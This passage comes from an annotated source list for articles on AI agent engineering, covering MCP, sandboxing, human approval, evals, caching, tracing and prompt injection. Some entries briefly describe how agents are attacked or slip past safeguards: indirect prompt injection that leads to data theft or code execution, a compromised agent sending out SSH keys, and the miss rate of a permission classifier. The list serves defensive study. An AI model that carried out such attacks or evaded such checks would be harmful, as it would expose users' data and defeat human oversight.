   Checked: Current, still in beta. The on-demand header is now `compact-2026-09-04`, newer than the `compact-2026-01-12` that search results and third-party guides still quote, so use this page and not those guides.
2. **The Complexity Trap: Simple Observation Masking Is as Efficient as LLM Summarization for Agent Context Management** by Tobias Lindenbauer, Igor Slinko, Ludwig Felder, Egor Bogomolov, Yaroslav Zharov (JetBrains), arXiv 2508.21433, revised 2025-10-27 (NeurIPS '25 DL4C workshop)
   https://arxiv.org/abs/2508.21433
   kind: paper · primary: yes
   Why: The counterpoint. Just hiding old tool outputs cut cost ~50% and solved as many tasks as LLM summarization on SWE-bench Verified. A mix of the two saved another 7–11%.
   Checked: Abstract loads. Note that it was measured on SWE-bench Verified, which OpenAI has since stopped reporting (see agent-evals).
3. Extras if wanted: context engineering post (see agent-memory #1) for how Claude Code compacts, and the Agent SDK loop docs (see agent-loop #2), which warn that early instructions can be lost and that lasting rules belong in CLAUDE.md, which is re-injected on every request.
Also serves: agent-memory, llm-latency and cost nodes.

### mcp (deep)
1. **Model Context Protocol Specification, version 2026-07-28** by the MCP maintainers, 2026-07-28
   https://modelcontextprotocol.io/specification/2026-07-28
   kind: spec · primary: yes
   Why: The authoritative text. JSON-RPC 2.0, hosts/clients/servers, tools/resources/prompts, elicitation, extensions (Tasks, MCP Apps), and the trust and safety principles.
   Checked: Marked latest. **It replaces 2025-11-25.** Cite this one, not older revisions.
2. **The 2026-07-28 Specification** (release post) by David Soria Parra and Den Delimarsky, 2026-07-28
   https://blog.modelcontextprotocol.io/posts/2026-07-28/
   kind: blog · primary: yes
   Why: Explains what changed and why. The protocol is now stateless (the `initialize` handshake and `Mcp-Session-Id` are gone), and it adds Multi Round-Trip Requests, header-based routing, cacheable list results (`ttlMs` and `cacheScope`), and tighter authorization.
   Checked: Loads. Most tutorials online still describe the old stateful handshake, so this post is needed to avoid teaching outdated material.
3. **Architecture overview** (MCP docs) by the MCP project, undated (pinned to 2026-07-28)
   https://modelcontextprotocol.io/docs/learn/architecture
   kind: docs · primary: yes
   Why: The best explainer. One client per server inside a host, data layer vs transport layer (stdio vs Streamable HTTP), a full JSON-RPC walkthrough of `server/discover`, `tools/list` and `tools/call`, and note that sampling and logging are deprecated.
   Checked: Current. It links docs versioned to 2026-07-28.
4. **MCP spec, Tools**: see tool-design #4. It contains the "human in the loop" SHOULD and the security MUSTs.
5. **Introducing the Model Context Protocol** by Anthropic, 2024-11-25
   https://www.anthropic.com/news/model-context-protocol
   kind: blog · primary: yes
   Why: The origin and the "why": the N×M integration problem.
   Checked: Loads. Use it for history only, since the protocol details are out of date.
6. **Code execution with MCP**: see tool-design #6. Shows the cost of loading many MCP tool definitions and one fix.
Also serves: tool-design, human-in-the-loop (#1, #4), sandboxing, data-exfiltration (phase 6).

### human-in-the-loop (short)
1. **Claude Code auto mode: a safer way to skip permissions** by John Hughes et al. (Anthropic), 2026-03-25
   https://www.anthropic.com/engineering/claude-code-auto-mode
   kind: blog · primary: yes
   Why: Real data on why approving every step fails. Users approve 93% of prompts ("approval fatigue"). A two-stage classifier reaches a 0.4% false-positive and 17% false-negative rate. The agent escalates to a human after 3 denials in a row or 20 in total.
   Checked: Loads and is current. Search results quoted a "97%" figure from other claude.com/press pages, but the engineering post I opened says 93%. Cite the post.
2. **Human-in-the-loop** (OpenAI Agents SDK docs) by OpenAI, undated, checked 2026-09-23
   https://openai.github.io/openai-agents-python/human_in_the_loop/
   kind: docs · primary: yes
   Why: The mechanism in code. `needs_approval` on a tool, the run pauses with `interruptions`, the state is saved with `to_state()` and `to_json()`, then approve or reject and resume. Useful for a durable pause in a web app.
   Checked: Loads and is current.
3. (Optional) **Interrupts** (LangGraph docs) by LangChain, undated
   https://docs.langchain.com/oss/python/langgraph/interrupts
   kind: docs · primary: yes
   Why: The same idea built on checkpoints, with a real gotcha: on resume the node restarts from the beginning, so side effects before `interrupt()` must be idempotent.
   Checked: Loads and is current.
Also useful: the MCP Tools spec's "there SHOULD always be a human in the loop with the ability to deny tool invocations" (tool-design #4), and 12-factor agents, Factor 7, "Contact humans with tool calls" (https://github.com/humanlayer/12-factor-agents, primary: no).
Also serves: sandboxing (#1), excessive-agency (phase 6).

### sandboxing (deep)
1. **Making Claude Code more secure and autonomous with sandboxing** by David Dworken and Oliver Weller-Davies (Anthropic), 2025-10-20
   https://www.anthropic.com/engineering/claude-code-sandboxing
   kind: blog · primary: yes
   Why: Why you need both filesystem and network isolation: "Without network isolation, a compromised agent could exfiltrate sensitive files like SSH keys; without filesystem isolation, a compromised agent could easily escape the sandbox." Uses bubblewrap and Seatbelt, cut permission prompts by 84%, and the runtime is open source.
   Checked: Loads and is current.
2. **Choose a sandbox environment** (Claude Code docs) by Anthropic, undated, checked 2026-09-23
   https://code.claude.com/docs/en/sandbox-environments
   kind: docs · primary: yes
   Why: A ladder from sandboxed Bash to sandbox runtime, dev container, VM or microVM, and cloud session, each with what it isolates. Also how isolation relates to permission modes: a classifier checks each action but is not a boundary.
   Checked: Current. I also opened https://code.claude.com/docs/en/sandboxing, the per-command sandbox reference. Its output was too large to read in full, but it matches.
3. **Firecracker** (project site) by AWS, undated
   https://firecracker-microvm.github.io/
   kind: docs · primary: yes
   Why: The microVM numbers: "< 125ms" boot, "< 5 MiB" overhead, 5 emulated devices, the jailer as a second layer of defense.
   Checked: Loads. The formal paper is Agache et al., NSDI '20 (https://www.usenix.org/conference/nsdi20/presentation/agache, USENIX open access), which I opened. Its abstract has no overhead numbers, so the site is the better citation.
4. **Firecracker vs gVisor: Sandbox Isolation for Untrusted and Agent-Generated Code** by Daniel Botha (Fly.io), 2026-09-09
   https://fly.io/learn/firecracker-vs-gvisor/
   kind: blog · primary: no (the comparison is general, though Fly runs Firecracker itself)
   Why: The threat-model framing in one pair of lines: "gVisor's threat model is a host kernel bug" vs "Firecracker's threat model is that the guest kernel is already gone." Also containers vs a user-space kernel vs a microVM.
   Checked: Very recent. It is a vendor explainer, so treat it with that in mind.
5. **The lethal trifecta for AI agents** by Simon Willison, 2025-06-16
   https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/
   kind: blog · primary: no
   Why: What a sandbox is protecting against: private data, untrusted content and a way to send data out. "95% is very much a failing grade" on guardrails.
   Checked: Loads. It is widely cited.
6. **Designing agentic loops** by Simon Willison, 2025-09-30
   https://simonwillison.net/2025/Sep/30/designing-agentic-loops/
   kind: blog · primary: no
   Why: The practical view of YOLO mode: its three risks, Docker or Codespaces as the sandbox, and scoped credentials with budget caps (a $5 Fly.io org).
   Checked: Loads.
Also serves: data-exfiltration and prompt-injection (#5), excessive-agency (#6), human-in-the-loop (#2).

### agent-evals (deep)
1. **Demystifying evals for AI agents** by Mikaela Grace, Jeremy Hadfield, Rodrigo Olivares, Jiri De Jonghe (Anthropic), 2026-01-09
   https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents
   kind: blog · primary: yes
   Why: Vocabulary and method. Transcript vs outcome, three grader types (code, model, human), and pass@k vs pass^k. It also warns against grading rigid step sequences, because "agents regularly find valid approaches that eval designers didn't anticipate."
   Checked: Loads and is current.
2. **τ-bench: A Benchmark for Tool-Agent-User Interaction in Real-World Domains** by Shunyu Yao, Noah Shinn, Pedram Razavi, Karthik Narasimhan, arXiv 2406.12045, 2024-06-17
   https://arxiv.org/abs/2406.12045
   kind: paper · primary: yes
   Why: Introduced pass^k for consistency. gpt-4o scored under 50%, and pass^8 was under 25% on retail. Grades the end state of the database, not the words.
   Checked: Loads. The follow-up is **τ²-bench** (arXiv 2506.07982, 2025-06-09, opened), which adds dual control where the user also acts. Cite τ² for current numbers and τ for the metric.
3. **Q: How do I evaluate agentic workflows?** by Hamel Husain and Shreya Shankar, 2025-06-29, modified 2026-09-01
   https://hamel.dev/blog/posts/evals-faq/how-do-i-evaluate-agentic-workflows.html
   kind: blog · primary: no (practitioners, well known for eval work)
   Why: The order of work. First measure end-to-end success, then step-level diagnostics (tool choice, parameters, error handling). Record the "first upstream failure". Uses transition failure matrices.
   Checked: Loads, updated this month.
4. **How to evaluate your agent with trajectory evaluations** (LangSmith docs) by LangChain, undated
   https://docs.langchain.com/langsmith/trajectory-evals
   kind: docs · primary: yes (for agentevals)
   Why: The concrete "grade the steps" tooling. Strict, unordered, subset and superset trajectory match, and an LLM judge on the trajectory. This is what the tutor-agent eval can copy.
   Checked: Loads and is current.
5. **AI Agents That Matter** by Sayash Kapoor, Benedikt Stroebl, Zachary Siegel, Nitya Nadgir, Arvind Narayanan, arXiv 2407.01502, 2024-07-01
   https://arxiv.org/abs/2407.01502
   kind: paper · primary: yes
   Why: Critiques agent evals. Accuracy alone ignores cost, benchmarks lack holdout sets, results are hard to reproduce, and simple baselines are often left out.
   Checked: Loads. It is from 2024, but the critique still applies.
6. **SWE-bench: Can Language Models Resolve Real-World GitHub Issues?** by Carlos Jimenez et al., arXiv 2310.06770, ICLR 2024, revised 2024-11-11
   https://arxiv.org/abs/2310.06770
   kind: paper · primary: yes
   Why: The model outcome-graded agent benchmark: 2,294 real issues, graded by running tests.
   Checked: Loads. **It is out of date as a leaderboard.** On 2026-02-23 OpenAI stopped reporting SWE-bench Verified over flawed tests and contamination, and now recommends SWE-bench Pro. I confirmed this through the Latent Space interview with Mia Glaese and Olivia Watkins (https://www.latent.space/p/swe-bench-dead, 2026-02-23, primary: no, opened). OpenAI's own post returned 403. That makes a good "benchmarks rot" point for the article.
Also serves: tool-design, phase 3 evals nodes (#1, #3), when-not-to-use-agents (#5).

### multi-agent (deep)
1. **How we built our multi-agent research system** by Jeremy Hadfield, Barry Zhang, Kenneth Lien, Florian Scholz, Jeremy Fox, Daniel Ford (Anthropic), 2025-06-13
   https://www.anthropic.com/engineering/multi-agent-research-system
   kind: blog · primary: yes
   Why: The case for multi-agent, with numbers. 90.2% better than single-agent Opus 4 on their research eval. About 15× the tokens of chat. Token usage explains 80% of variance. It also says where multi-agent fits badly: shared context and most coding.
   Checked: Loads. The models used (Opus 4, Sonnet 4) are old now.
2. **Don't Build Multi-Agents** by Walden Yan (Cognition), 2025-06-12
   https://cognition.com/blog/dont-build-multi-agents (cognition.ai redirects)
   kind: blog · primary: yes
   Why: The case against. "Share context, and share full agent traces" and "Actions carry implicit decisions". Includes the Flappy Bird example.
   Checked: Loads. **The author has partly updated it** (see #3). It also says Claude Code avoids parallel subagents, which is no longer true: Claude Code and the Agent SDK now spawn parallel subagents.
3. **Multi-Agents: What's Actually Working** by Walden Yan (Cognition), 2026-04-22
   https://cognition.com/blog/multi-agents-working
   kind: blog · primary: yes
   Why: The revision. Multi-agent works when "writes stay single-threaded" and extra agents "contribute intelligence rather than actions". Three patterns: a code-review loop (about 2 bugs per PR, 58% severe), a "smart friend" model, and manager-workers.
   Checked: Loads. Read it together with #2.
4. **Towards a Science of Scaling Agent Systems** by Yubin Kim, Ken Gu et al. (19 authors), arXiv 2512.08296, v1 2025-12-09, revised 2026-04-08
   https://arxiv.org/abs/2512.08296
   kind: paper · primary: yes
   Why: A controlled study over 260 configurations. Results swing from +80.8% to −70.0% depending on the task. Multi-agent hurts on tool-heavy and sequential tasks, and returns shrink once the single-agent baseline is strong.
   Checked: Abstract page loads. Some specific numbers from search snippets (the ~45% saturation point and 17.2× error amplification) were not in what I saw on the abstract page. Check them in the PDF before citing.
5. **Why Do Multi-Agent LLM Systems Fail?** by Mert Cemri et al., arXiv 2503.13657, v1 2025-03-17, revised 2025-10-26
   https://arxiv.org/abs/2503.13657
   kind: paper · primary: yes
   Why: The MAST taxonomy: 14 failure modes in 3 groups (system design, inter-agent misalignment, task verification), from 1,600+ traces across 7 frameworks, κ = 0.88.
   Checked: Abstract loads.
6. **Agent orchestration: handoffs vs agents-as-tools** (OpenAI docs), undated
   https://developers.openai.com/api/docs/guides/agents/orchestration
   kind: docs · primary: yes
   Why: Two concrete shapes (a handoff gives up control, an agent-as-tool keeps the manager in charge). Also "Start with a single agent" and "splitting too early creates more prompts, more traces, and more approval surfaces."
   Checked: Loads and is current.
Also serves: agent-memory (#1), when-not-to-use-agents (#2, #4, #6), agent-evals (#1 has an eval section).

### when-not-to-use-agents (deep)
1. **Building effective agents**: see agent-loop #1. "Find the simplest solution possible", and agents "trade latency and cost for better task performance".
2. **How to think about agent frameworks** by Harrison Chase (LangChain), 2025-04-20
   https://www.langchain.com/blog/how-to-think-about-agent-frameworks (the old blog.langchain.com URL redirects)
   kind: blog · primary: no (a framework vendor's view)
   Why: The "agenticness spectrum" and "nearly all production agentic systems are a combination of workflows and agents". It openly argues with OpenAI's guide.
   Checked: Loads. Read it as a vendor with a stake (LangGraph).
3. **12-Factor Agents** by Dex Horthy (HumanLayer), 2025
   https://github.com/humanlayer/12-factor-agents
   kind: code/docs · primary: no
   Why: A practitioner's observation that most "agents" shipping in production are "mostly deterministic code, with LLM steps sprinkled in". Also "own your control flow" and "small, focused agents".
   Checked: Repo loads. I couldn't see the date of the last commit.
4. **AI Agents That Matter**: see agent-evals #5. Complex agents often don't beat simple, cheaper baselines once cost is counted.
5. **Designing agentic loops**: see sandboxing #6. Agents fit problems with clear success criteria that need trial and error, like tests to pass.
6. **Towards a Science of Scaling Agent Systems**: see multi-agent #4. It is evidence that adding agents or coordination can make results worse.
Also serves: llm-workflows (phase 1 or 4), multi-agent.

### Disagreements and tensions
- **Anthropic vs Cognition on multi-agent (June 2025, one day apart).** Anthropic reports +90.2% from parallel subagents on research tasks. Cognition says parallel agents make conflicting implicit decisions and you shouldn't build them. They agree more than it seems: Anthropic also says coding and tasks with shared context fit badly. In April 2026 Cognition narrowed its position to "single writer, many readers".
- **Cognition 2025 vs Cognition 2026.** The author changed his view. The article should present this as a change over time, not a fixed disagreement.
- **Empirical studies vs the builders' posts.** The scaling paper (−39% to −70% on sequential tasks) and MAST ("gains are often minimal") are more doubtful than Anthropic's research-system numbers, which come from one internal eval.
- **Grading steps vs grading outcomes.** The node note says "grade the steps". Anthropic's evals post says prefer outcome checks over rigid step sequences. Hamel says end-to-end first, steps only to diagnose. LangSmith's strict trajectory match enforces exact order. The article needs to take a side on this.
- **Compaction by summary vs masking.** Anthropic, Claude docs and Cognition all push LLM summarization. JetBrains found simply masking old observations as good for half the cost.
- **Human in the loop: MCP spec vs Anthropic's data.** The spec says there "SHOULD always be a human in the loop". Anthropic measured a 93% approval rate and argues a classifier plus a sandbox beats tired humans. Its own docs say the classifier "is not an isolation boundary".
- **Declarative graphs vs agent abstractions.** Harrison Chase (LangChain) explicitly criticizes OpenAI's practical guide on declarative vs code-first orchestration.
- **Tool count.** OpenAI suggests "fewer than 20 functions". Anthropic tells you to consolidate tools (an `action` parameter) and to use tool search or code execution to go past the limit. They agree in direction and differ in method.
- **Shell vs MCP.** Simon Willison ("Designing agentic loops") prefers plain shell commands and an AGENTS.md over MCP. Anthropic's code-execution post also moves away from direct MCP tool calls. Both are worth mentioning in the mcp node.

### Couldn't open
- https://cdn.openai.com/business-guides-and-resources/a-practical-guide-to-building-agents.pdf: the fetch returned the binary PDF and it couldn't be parsed into text. The HTML page https://openai.com/business/guides-and-resources/a-practical-guide-to-building-ai-agents/ returned 403. Not verified, so don't cite it. It would be a good primary source for when-not-to-use-agents and human-in-the-loop if you can open it in a browser.
- https://openai.com/index/introducing-swe-bench-verified/: 403.
- https://openai.com/index/why-we-no-longer-evaluate-swe-bench-verified/: 403. The Latent Space interview with the OpenAI researchers (listed above) stands in for it.

### Rejected
- **aihero.dev AI Engineer Roadmap** (https://www.aihero.dev/ai-engineer-roadmap, updated 2025-03-18): opened, but it doesn't cover agents, MCP, evals or human-in-the-loop.
- **E2B docs** (https://docs.e2b.dev/): opened. It is a product overview that doesn't mention Firecracker or its isolation model. The Firecracker site and Fly.io comparison cover sandboxing better.
- **Firecracker NSDI '20 paper**: opened, but it is kept as a backup only because its abstract gives no overhead numbers and the project site does.
- **Chroma "Context Rot"** (https://www.trychroma.com/research/context-rot, 2025-07-14, opened): good, but it belongs under context-window (phase 1 or 2) more than here. It tested 18 models.
- **Letta docs pages** (memory blocks, archival memory): search results only. The Letta blog post covers the same ideas.
- **Third-party compaction guides** (claudelab.net and others): secondary, and they quote an outdated beta header.
- **Medium, Northflank and SoftwareSeni sandbox explainers**: secondary. Primary or builder sources exist.
- **hidekazu-konishi MCP version timeline**: secondary. The official changelog and release post exist.

### Gaps
- **when-not-to-use-agents**: No primary source gives hard numbers for "a workflow beat an agent on the same task". The evidence is indirect (Kapoor et al., the scaling paper). The OpenAI practical guide would help if it can be opened.
- **human-in-the-loop**: Plenty of mechanism, but approval fatigue has only one data source (Anthropic's auto-mode post). No independent study.
- **sandboxing**: Nothing primary that is specific to agents covers gVisor, only the Fly.io comparison. The claims about how E2B is built could not be confirmed from its own docs.
- **agent-evals**: No source covers evaluating a *tutoring* agent specifically, meaning pedagogy-quality rubrics. You'll need to design that yourself, maybe with a decision record.
- **multi-agent**: Two numbers in the scaling paper (the ~45% saturation point and 17.2× error amplification) came only from search snippets. Check them in the PDF before citing.
- **Map note**: `computer-use` is still listed as "possibly missing" in `tentative-shape.md`. I didn't look for sources for it.

## Phase 6: Production and security

I opened every source below on 2026-09-23 and checked that what I say about it matches what I saw.

Three things to know before you use this list:

- **OWASP published a 2026 edition of its LLM Top 10** on 2026-08-03/04. The 2025 list is no longer the latest.
- **The OpenTelemetry GenAI semantic conventions moved** to a separate GitHub repo. The old opentelemetry.io spec pages now only point there.
- **Microsoft Presidio moved** to a community project, the Data Privacy Stack.

### prompt-caching (deep)
1. **Prompt caching (Claude API docs)** by Anthropic, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/docs/build-with-claude/prompt-caching (docs.anthropic.com redirects here)
   kind: docs · primary: yes
   Why: The full mechanism. The prefix is cached in the order tools → system → messages, you mark `cache_control` breakpoints, and there's an automatic mode. Also covers the 5-minute and 1-hour TTLs and the prices: writes cost 1.25x (5 min) or 2x (1 h), reads cost 0.1x on most models.
   Checked: Current. It lists Opus 5.5 and Fable 5.1, and minimum cacheable lengths per model (512 to 4,096 tokens). Too-short prompts are silently not cached.
2. **Prompt caching (OpenAI API docs)** by OpenAI, undated, checked 2026-09-23
   https://developers.openai.com/api/docs/guides/prompt-caching (platform.openai.com redirects here)
   kind: docs · primary: yes
   Why: The automatic-caching design to contrast with Anthropic's. It's on by default, requests are routed by a hash of the first tokens, `prompt_cache_key` exists, and the minimum is 1,024 tokens.
   Checked: Current. It mentions GPT-5.6: cache writes now cost 1.25x, reads 0.1x, 30-minute TTL. Older models had in-memory or 24-hour retention.
3. **Prompt caching with Claude (launch post)** by Anthropic, 2024 (launch; general availability 2024-12-17 per search result)
   https://claude.com/blog/prompt-caching
   kind: blog · primary: yes
   Why: Real latency and cost numbers. A 100K-token prompt went from 11.5 s to 2.4 s (-79%, -90% cost). A 10-turn chat went from about 10 s to 2.5 s.
   Checked: Opened. The prices quoted are for Claude 3.5 Sonnet, which is outdated. Use it for the percentages only.
4. **Lessons from building Claude Code: prompt caching is everything** by Thariq Shihipar (Anthropic), 2026-04-30
   https://claude.dev/blog/lessons-from-building-claude-code-prompt-caching-is-everything/
   kind: blog · primary: yes
   Why: The reasons behind design choices in a real product. Don't change tools or models mid-session. Put updates in messages, not the system prompt. Compaction has to reuse the same prefix. "we run alerts on our prompt cache hit rate and declare SEVs if they're too low."
   Checked: Current. claude.com redirects to claude.dev.
5. **Context Engineering for AI Agents: Lessons from Building Manus** by Yichao "Peak" Ji, 2025-07-18
   https://manus.im/blog/Context-Engineering-for-AI-Agents-Lessons-from-Building-Manus
   kind: blog · primary: yes (the builders' own post)
   Why: An agent team calls KV-cache hit rate "the single most important metric". Covers stable prefixes, no timestamps, deterministic JSON, and a 100:1 input-to-output ratio.
   Checked: Opened. The prices are old Sonnet prices, but the practices are still valid.
6. **Prompt caching: 10x cheaper LLM tokens, but how?** by Sam Rose (ngrok), 2025-12-16
   https://ngrok.com/blog/prompt-caching
   kind: blog · primary: no
   Why: A visual walk from attention to cached K/V. He also ran his own test: Anthropic hit the cache 100% of the time, OpenAI about 50% with automatic caching. Good for your "I ran it" section.
   Checked: Current.

Optional: **Prompt Cache: Modular Attention Reuse** by Gim et al., MLSys 2024 (https://arxiv.org/abs/2311.04934). This is the research ancestor: 8x lower time-to-first-token on GPU, 60x on CPU. The **Gemini context caching docs** (https://ai.google.dev/gemini-api/docs/caching) cover implicit caching on Gemini 2.5+, with minimums of 2,048 or 4,096 tokens. The page I got showed no TTL or pricing.
Also serves: kv-cache, llm-latency, rate-limits (Anthropic cached reads don't count toward ITPM), provider-fallback (see tensions).

### semantic-caching (short)
1. **Redis semantic cache (use-case docs)** by Redis, undated, checked 2026-09-23
   https://redis.io/docs/latest/develop/use-cases/semantic-cache/
   kind: docs · primary: yes (for the Redis implementation)
   Why: A practical design in one page. Embed the question, run nearest-neighbour search with a distance threshold, filter by metadata (tenant, locale, model version), set a TTL. It names the real problem: "too loose and you serve wrong answers, too tight and the hit rate collapses."
   Checked: Current. It also says prompt caching "does not address latency", which is a disagreement (see tensions).
2. **vCache: Verified Semantic Prompt Caching** by Schroeder et al., v5 2026-02-21 (ICLR 2026)
   https://arxiv.org/abs/2502.03771
   kind: paper · primary: yes
   Why: Shows that one fixed similarity threshold gives unpredictable error rates. Learning a threshold per entry gets up to 12.5x more hits and 26x fewer errors.
   Checked: Current, accepted at ICLR 2026.

Alternates:
- **GPTCache** repo (https://github.com/zilliztech/GPTCache): lists the modules, warns about false positives, says "API may be subject to change".
- GPTCache paper, Fu Bang, NLP-OSS 2023 (https://aclanthology.org/2023.nlposs-1.24/).
- **Key Collision Attack on LLM Semantic Caching**, Zhang et al., ICML 2026, revised 2026-06-30 (https://arxiv.org/abs/2601.23088). Attackers hijack cached responses 86% of the time. It's a security angle for this node.

Also serves: embeddings, cosine-similarity, prompt-caching (compare_with).

### rate-limits (short)
1. **Rate limits (Claude API docs)** by Anthropic, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/api/rate-limits
   kind: docs · primary: yes
   Why: The token bucket ("continuously replenished … rather than being reset at fixed intervals"). Separate RPM, ITPM and OTPM limits. Cached reads don't count toward ITPM. `max_tokens` doesn't count toward OTPM. `retry-after` and `anthropic-ratelimit-*` headers. A spend-cap 429 has no `retry-after`, so retrying never helps.
   Checked: Current. It has tier tables for Opus 5.5 and Fable 5.x.
2. **Rate limits (OpenAI API docs)** by OpenAI, undated, checked 2026-09-23
   https://developers.openai.com/api/docs/guides/rate-limits
   kind: docs · primary: yes
   Why: The other big design: RPM, TPM, RPD, TPD, six usage tiers, `x-ratelimit-*` headers. Here `max_tokens` does count toward the limit.
   Checked: Current.
Also serves: retries, prompt-caching, cost-tracking.

### retries (short)
1. **Exponential Backoff and Jitter** by Marc Brooker (AWS Architecture Blog), 2015-03-04
   https://aws.amazon.com/blogs/architecture/exponential-backoff-and-jitter/
   kind: blog · primary: yes
   Why: The simulation behind jitter. It compares full, equal and decorrelated jitter. Full jitter finishes fastest, and backoff without jitter is worst.
   Checked: Old but not replaced. AWS docs from 2026 still link to it.
2. **Handling Overload (Google SRE book, ch. 21)** by Google, 2016 book, checked 2026-09-23
   https://sre.google/sre-book/handling-overload/
   kind: book · primary: yes
   Why: Retry budgets: at most 3 attempts per request, and a client retries only while retries are under 10% of its requests. Retry at one layer only, to avoid a "combinatorial explosion".
   Checked: Opened. Still the standard reference.

Alternates:
- **Claude API errors** (https://platform.claude.com/docs/en/api/errors): which codes to retry (429, 500, 529 overloaded), SDKs retry twice by default and respect `retry-after`, errors can arrive mid-stream after a 200.
- **AWS Well-Architected REL05-BP03** (https://docs.aws.amazon.com/wellarchitected/latest/reliability-pillar/rel_mitigate_interaction_failure_limit_retries.html): anti-patterns such as retrying non-idempotent calls and retrying at several layers.
- **OpenAI cookbook: How to handle rate limits** (https://developers.openai.com/cookbook/examples/how_to_handle_rate_limits): "unsuccessful requests contribute to your per-minute limit".
- **Making retries safe with idempotent APIs**, Malcolm Featonby (https://aws.amazon.com/builders-library/making-retries-safe-with-idempotent-APIs/): undated.

Also serves: rate-limits, provider-fallback.

### provider-fallback (short)
1. **AI Gateway Model Fallbacks** by Vercel, last updated 2026-09-10
   https://vercel.com/docs/ai-gateway/models-and-providers/model-fallbacks
   kind: docs · primary: yes
   Why: The clearest mechanism. It falls back through providers for one model first (`order`), then to the next model (`models`). The `modelAttempts` metadata shows every failed attempt with status and time, which is useful for the tracing build.
   Checked: Current, uses AI SDK 7.
2. **Model Fallbacks** by OpenRouter, undated, checked 2026-09-23
   https://openrouter.ai/docs/guides/routing/model-fallbacks
   kind: docs · primary: yes
   Why: Says what triggers a fallback: context-length errors, moderation flags, rate limits, downtime. You're billed for the model that actually served the request.
   Checked: Current.

Alternate: **LiteLLM Reliability docs** (https://docs.litellm.ai/docs/proxy/reliability). Separates general, context-window and content-policy fallbacks, and adds cooldowns (`allowed_fails`, `cooldown_time`). Undated.
Also serves: retries, llm-tracing.

### llm-tracing (deep)
1. **GenAI spans (OpenTelemetry semantic conventions)** by the OpenTelemetry GenAI SIG, status: Development, checked 2026-09-23
   https://github.com/open-telemetry/semantic-conventions-genai/blob/main/docs/gen-ai/gen-ai-spans.md
   kind: spec · primary: yes
   Why: The standard fields: span name `{gen_ai.operation.name} {gen_ai.request.model}`, `gen_ai.provider.name`, `gen_ai.usage.input_tokens` and `output_tokens`. Message content (`gen_ai.input.messages`) is opt-in because it "is likely to contain sensitive information".
   Checked: Still marked Development, so not stable. The old opentelemetry.io/docs/specs/semconv/gen-ai/ pages now only point to this repo. The repo covers spans, agent spans, metrics, events and MCP.
2. **Tracing data model** by Langfuse, undated, checked 2026-09-23
   https://langfuse.com/docs/observability/data-model
   kind: docs · primary: yes
   Why: A concrete model: observations (span, generation, event) nest inside traces, and traces group into sessions. It's built on OpenTelemetry.
   Checked: Current.
3. **Your AI Product Needs Evals** by Hamel Husain, 2024-03-29
   https://hamel.dev/blog/posts/evals/
   kind: blog · primary: yes (practitioner)
   Why: The reason tracing exists: logging traces comes before any eval, and "You must remove all friction from the process of looking at data."
   Checked: Opened. Some tool names are dated (Lilac); the argument holds.
4. **All the Hard Stuff Nobody Talks About When Building Products with LLMs** by Phillip Carter (Honeycomb), 2024-08-26
   https://www.honeycomb.io/blog/hard-stuff-nobody-talks-about-llm
   kind: blog · primary: yes (Query Assistant team)
   Why: Production numbers from an observability company. Calls took 2 to 15+ s. Chaining 5 calls that are each 90% accurate gives 59%.
   Checked: Opened. Model-era details are dated.

Also useful: Vercel `modelAttempts` (see provider-fallback #1) as an example of fallback attempts in trace data.
Also serves: llm-latency, pii-handling, offline-evals, cost-tracking.

### prompt-versioning (short)
1. **Prompt version control** by Langfuse, undated, checked 2026-09-23
   https://langfuse.com/docs/prompt-management/features/prompt-version-control
   kind: docs · primary: yes
   Why: The registry model. Versions are automatic, labels (`production`, `latest`) are pointers, and rolling back means moving the label: "You can quickly rollback to a previous version by setting the `production` label to that previous version." Protected labels too.
   Checked: Current.
2. **Factor 2: Own your prompts (12-Factor Agents)** by HumanLayer (Dex Horthy's project), undated, checked 2026-09-23
   https://github.com/humanlayer/12-factor-agents/blob/main/content/factor-02-own-your-prompts.md
   kind: code/docs · primary: no (opinion essay)
   Why: The opposing view. Prompts are "first-class code", versioned and tested in your repo, not a framework black box.
   Checked: Opened.

Alternates:
- **Langfuse prompt management overview** (https://langfuse.com/docs/prompt-management/overview): client-side caching, links prompt versions to traces.
- **Braintrust prompts** (https://www.braintrust.dev/docs/guides/prompts): pin by version ID, environments. It doesn't describe a rollback flow.
- **Humanloop migration notice** (https://humanloop.com/docs/guides/migrating-from-humanloop): the platform shut down 2025-09-08 and all prompts, versions and logs became inaccessible. This is a real vendor-risk argument for keeping prompts in git.

Also serves: prompts-as-code, model-upgrades, llm-tracing.

### model-upgrades (short)
1. **How is ChatGPT's behavior changing over time?** by Lingjiao Chen, Matei Zaharia, James Zou, final version 2023-10-31
   https://arxiv.org/abs/2307.09009
   kind: paper · primary: yes
   Why: Evidence that "the same" model changes. GPT-4 prime-number accuracy fell from 84% (March 2023) to 51% (June 2023).
   Checked: Old models, but still the standard evidence for drift. Pair it with #2 to show how providers answered with pinned snapshots.
2. **Model IDs and versioning** by Anthropic, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/about-claude/models/model-ids-and-versions
   kind: docs · primary: yes
   Why: From the 4.6 generation on, dateless IDs are pinned snapshots, not aliases that move. It also admits that serving infrastructure changes (router, safety classifiers, sampling) can shift behavior without a new ID.
   Checked: Current.

Alternates:
- **Model deprecations** (https://platform.claude.com/docs/en/about-claude/model-deprecations): lifecycle states, at least 60 days' notice, retirement table (Opus 4.1 retired 2026-08-05).
- **How to evaluate LLMs before production** by Mariko Wakabayashi and Zixiao Chen, GitHub blog, 2026-08-25 (https://github.blog/ai-and-ml/llms/how-to-evaluate-llms-before-production/): primary, secret-scanning team. Rerun offline evals whenever a component changes.
- **OpenAI evaluation best practices** (https://developers.openai.com/api/docs/guides/evaluation-best-practices): continuous evaluation on every change.

Also serves: offline-evals, prompt-versioning.

### prompt-injection (deep)
1. **Prompt injection attacks against GPT-3** by Simon Willison, 2022-09-12
   https://simonwillison.net/2022/Sep/12/prompt-injection/
   kind: blog · primary: yes (coined the term)
   Why: The origin and the SQL-injection comparison: "I propose that the obvious name for this should be prompt injection."
   Checked: Historical anchor. The series (24 posts, latest 2025-11-02) is at https://simonwillison.net/series/prompt-injection/.
2. **Not what you've signed up for: Indirect Prompt Injection** by Greshake, Abdelnabi, Mishra, Endres, Holz, Fritz, v2 2023-05-05
   https://arxiv.org/abs/2302.12173
   kind: paper · primary: yes
   Why: Defines indirect injection through retrieved content, with a taxonomy (data theft, worming, code execution) and demos against Bing Chat. "LLM-Integrated Applications blur the line between data and instructions."
